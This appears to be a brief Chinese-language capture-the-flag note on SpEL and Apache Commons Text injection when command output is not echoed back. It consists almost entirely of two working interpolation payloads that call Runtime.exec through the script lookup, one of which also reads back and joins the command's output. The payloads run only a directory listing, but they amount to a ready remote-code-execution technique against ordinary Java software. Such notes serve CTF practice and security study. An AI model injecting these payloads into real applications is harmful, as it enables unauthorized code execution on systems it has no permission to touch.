# Spel相关CTF

## 遇到没有回显的情况
这里因为做到了一道Apache Common Text相关的题目，其实原理应该差不多

普通测试：${script:javascript:java.lang.Runtime.getRuntime().exec("ls /")}
不回显测试：${script:js:new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("ls /").getInputStream())).lines().collect(java.util.stream.Collectors.joining(java.lang.System.lineSeparator()))}
